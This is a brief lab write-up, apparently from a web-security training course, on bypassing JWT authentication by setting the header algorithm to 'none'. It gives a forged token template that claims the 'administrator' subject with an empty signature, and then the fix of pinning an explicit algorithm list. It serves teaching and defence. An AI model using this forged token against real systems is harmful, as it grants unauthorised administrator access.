# Lab 2 — JWT Auth Bypass via alg:none (APPRENTICE)

## Attack
Set `alg: "none"` in header → server skips signature verification.

## Token Structure
```
base64url({"alg":"none","typ":"JWT"}) . base64url({"sub":"administrator"}) .
```
Note trailing dot — empty signature field required.

## Fix
`algorithms=["HS256"]` — explicit list that excludes "none".
